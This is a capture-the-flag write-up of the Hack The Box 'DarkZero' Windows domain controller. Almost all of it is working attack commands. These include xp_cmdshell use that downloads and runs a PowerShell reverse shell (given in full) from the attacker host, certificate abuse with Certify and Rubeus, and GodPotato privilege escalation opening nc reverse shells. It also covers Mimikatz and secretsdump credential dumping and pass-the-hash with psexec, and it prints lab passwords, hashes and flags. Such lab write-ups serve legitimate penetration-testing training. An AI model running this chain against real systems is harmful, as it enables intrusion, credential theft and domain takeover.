# Hack The Box — DarkZero (Full Write‑Up)

- **IP:** `10.129.63.252`
- **OS:** Windows Server 2022
- **Difficulty:** Hard
- **Date Completed:** Nov 2025

---

## 🎯 Target Information & Initial Enumeration

### 🔍 Nmap (key results)
```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          (darkzero.htb)
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022
5985/tcp  open  http          Microsoft HTTPAPI (WinRM)
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  ssl/ldap      Global Catalog over SSL
9389/tcp  open  mc-nmf        .NET Message Framing
```
**Notes:** Hostname `DC01.darkzero.htb`. Classic **AD + MSSQL** DC with WinRM available.

---

## 1) Foothold — MSSQL → `xp_cmdshell` → Reverse Shell

### Connect to MSSQL (Windows auth)
```bash
impacket-mssqlclient john.w:'RFulUtONCOL!'@10.129.20.144 -windows-auth
```

### Enable `xp_cmdshell` and pull a PowerShell reverse shell
```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
EXEC ('xp_cmdshell ''certutil -urlcache -f http://10.10.15.15/shell.ps1 C:\Windows\Temp\shell.ps1 & powershell -NoP -NonI -W Hidden -Exec Bypass -File C:\Windows\Temp\shell.ps1'' ') AT [DC02.darkzero.ext];
```

Reverse shell payload (hosted at `/var/www/html/shell.ps1`):
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.15",4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object System.Byte[] 1024;
while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);
  $send = (Invoke-Expression $data 2>&1 | Out-String );
  $writer.Write($send);
  $writer.Flush();
}
```
Listener:
```bash
rlwrap nc -lvnp 4444
```

---

## 2) ADCS + PKINIT — Certify → PFX → Rubeus TGT

### Request a cert for `svc_sql` and export to PFX
```powershell
certutil -urlcache -f http://10.10.15.15/Certify.exe C:\Users\Public\Certify.exe
.\Certify.exe request /ca:DC02.darkzero.ext\darkzero-ext-DC02-CA /template:User /altname:svc_sql --output-pem
```
On Kali:
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
certutil -urlcache -f http://10.10.15.15/cert.pfx C:\Users\Public\cert.pfx
```

### Ask TGT with certificate (PKINIT)
```powershell
certutil -urlcache -f http://10.10.15.15/Rubeus.exe C:\Users\Public\Rubeus.exe
.\Rubeus.exe asktgt /user:svc_sql /certificate:cert.pfx /getcredentials /unpac /domain:darkzero.ext /dc:DC02.darkzero.ext
```
> Output included `rc4_hmac` key material and an NTLM for `svc_sql` (via U2U).

---

## 3) Tunneling & Remote Execution — Ligolo → Change Password → RunAsCs

### Ligolo (agent + proxy)
On host:
```powershell
certutil -urlcache -f http://10.10.15.15/agent.exe C:\Users\Public\agent.exe
.gent.exe -connect 10.10.15.15:11601 --ignore-cert
```
On Kali:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.129.20.122/32 dev ligolo
./proxy -selfcert
# choose the session when the agent joins
```

### Change `svc_sql` password using NTLM (SAMR)
```bash
impacket-changepasswd -debug darkzero-ext/svc_sql@172.16.20.2 -hashes :816CCB849956B531DB139346751DB65F
# New password: test123!
```

### RunAsCs to verify / spawn reverse shell
```powershell
certutil -urlcache -f http://10.10.15.15/_RunasCs.exe C:\Users\Public\_RunasCs.exe
.\_RunasCs.exe svc_sql test123! "cmd /c whoami /all" -d darkzero-ext -l 5 --remote-impersonation -f 0
.\_RunasCs.exe -l 5 -b svc_sql test123! cmd.exe -r 10.10.15.15:4445
# Kali:
rlwrap nc -lvnp 4445
```
`whoami /priv` confirmed **SeImpersonatePrivilege** (key for token-based LPE).

---

## 4) Local PrivEsc — GodPotato → SYSTEM

Upload & run:
```powershell
certutil -urlcache -f http://10.10.15.15/GodPotato-NET4.exe C:\Users\Public\GodPotato-NET4.exe
GodPotato-NET4.exe -cmd "cmd /c whoami"
# => nt authority\system
```
SYSTEM reverse shell:
```powershell
GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe 10.10.15.15 5555 -e cmd.exe"
# Kali:
rlwrap nc -lvnp 5555
# whoami => nt authority\system
```

### User Flag
```
C:\Users\Administrator\Desktop\user.txt
e0acc3b4013779c34bba0e1b15289daf
```

---

## 5) Credential Dumping & Domain Recon

### Mimikatz
```powershell
certutil -urlcache -f http://10.10.15.15/mimikatz.exe C:\Users\Public\mimikatz.exe
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
```
Key finds (snippets):
- Local Administrator NTLM: `6963aad8ba1150192f3ca6341355eb49`
- Service secret: `MSSQLSERVER` → `svc_sql : enTRanDiVec!`
- DPAPI_SYSTEM, NL$KM, etc.

### SharpHound Collection
```powershell
certutil -urlcache -f http://10.10.15.15/SharpHound.exe C:\Users\Public\SharpHound.exe
.\SharpHound.exe -c All -d darkzero.ext --zipfilename sharphound.zip
```
Pulled the ZIP over SMB and graphed. Saw **DARKZERO.HTB** domain objects.

---

## 6) Cross-domain Ticket → DRSUAPI Dump (DC01$)

### Capture DC01$ ticket with Rubeus monitor
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
# Found new TGT for DC01$@DARKZERO.HTB
# Copied Base64 ticket
```

### Convert ticket → ccache and set env
```bash
echo '<BASE64_TICKET>' | base64 -d > dc01.kirbi
impacket-ticketConverter dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache
echo '10.129.20.144 DARKZERO.HTB DC01.darkzero.htb' | sudo tee -a /etc/hosts
```

### Dump NTDS with Kerberos (no password)
```bash
secretsdump.py 'DC01$'@DC01.darkzero.htb -k -no-pass
```
Notable hashes/keys (excerpt):
```
Administrator:500:...:5917507bdf2ef2c2b0a869a1cba40726:::
krbtgt:502:...:64f4771e4c60b8b176c3769300f6f3f7:::
...
```

---

## 7) Domain Admin Shell & Root Flag (final)

Using the dumped Administrator hash to get a remote admin shell and read flags:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726 DARKZERO.HTB/Administrator@10.129.20.144
```
Then:
```
C:\Users\Administrator\Desktop> type root.txt
9f4b3c9cdacce751b11fdf3d6feeedfc
```
Service and artifact cleanup followed (`psexec` removes service by default at exit).

### ✅ Final Flags
- **User:** `e0acc3b4013779c34bba0e1b15289daf`
- **Root:** `9f4b3c9cdacce751b11fdf3d6feeedfc`

---

## 🔚 Summary (Kill Chain)

1. **External Recon** → DC with AD + MSSQL exposed.
2. **Foothold** → MSSQL (`xp_cmdshell`) ⇒ PowerShell reverse shell.
3. **ADCS Abuse** → Certify (User template) ⇒ PFX ⇒ **PKINIT** TGT for `svc_sql`.
4. **Pivot/Control** → Ligolo tunnel; change `svc_sql` password (SAMR); **RunAsCs** exec.
5. **Local PrivEsc** → `SeImpersonatePrivilege` ⇒ **GodPotato** ⇒ **SYSTEM**.
6. **Cred Dump** → Mimikatz (local SAM/secrets), SharpHound (graphing).
7. **Kerberos Ops** → Rubeus monitor to capture **DC01$** TGT ⇒ ticket → ccache.
8. **DRSUAPI** → `secretsdump -k` with `DC01$` ⇒ dump domain hashes.
9. **DA Shell** → `psexec` with Administrator NTLM ⇒ **root flag**.

---

## 🧠 Lessons Learned

- **ADCS + PKINIT** is stealthy and powerful for lateral movement without plaintext creds.
- SQL Server often enables **code exec** via `xp_cmdshell` or linked servers.
- **SeImpersonatePrivilege** almost guarantees local SYSTEM with modern Potato techniques.
- **Ligolo** provides quick agent-based pivoting with minimal friction.
- Collecting **machine TGTs** (e.g., `DC$`) can be enough for **DRSUAPI** secretsdump with `-k`.
- Always manage time/clock skew (Kerberos), hosts entries, and ticket caches carefully.

---
